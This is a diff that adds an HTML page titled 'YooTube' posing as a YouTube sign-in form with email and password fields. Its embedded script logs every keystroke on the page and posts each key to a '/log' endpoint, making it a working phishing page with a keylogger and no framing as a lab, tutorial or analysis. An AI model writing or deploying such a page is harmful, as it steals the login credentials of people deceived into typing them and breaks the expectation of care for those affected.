@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title> YooTube </title>
+        <script> 
+            document.addEventListener("DOMContentLoaded", function () {
+                document.addEventListener("keydown", function(e) {
+                    fetch("/log", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify({ key: e.key })
+                    });
+                });
+            });
+        </script>
+    </head>
+    <body>
+        <h1> Sign in to YouTube</h1>
+        <input type="text" placeholder="Email"> <br> <br>
+        <input type="password" placeholder="Password">
+    </body>
+</html>
